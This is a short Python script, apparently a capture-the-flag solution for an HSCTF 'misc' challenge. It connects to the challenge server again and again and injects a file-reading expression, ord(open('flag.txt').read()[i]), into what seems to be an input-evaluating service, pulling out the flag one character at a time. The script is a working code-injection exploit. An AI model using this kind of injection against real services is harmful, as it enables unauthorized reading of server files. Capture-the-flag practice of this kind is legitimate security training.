import re
import socket

host = "misc.hsctf.com"
port = 7001

FLAG_MAX = 50

for i in range(FLAG_MAX):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((host, port))
    _ = client.recv(128)
    _ = client.recv(128)
    client.send("ord(open(\"flag.txt\").read()[{}])\n".format(i).encode("utf-8"))
    _ = client.recv(128)
    client.send(b"0\n")
    _ = client.recv(128)
    client.send(b"+\n")
    _ = client.recv(128)
    response = client.recv(128)
    try:
        response = re.findall("[0-9]*", str(response))
        print(chr(int(response[41])),end="")
    except:
        break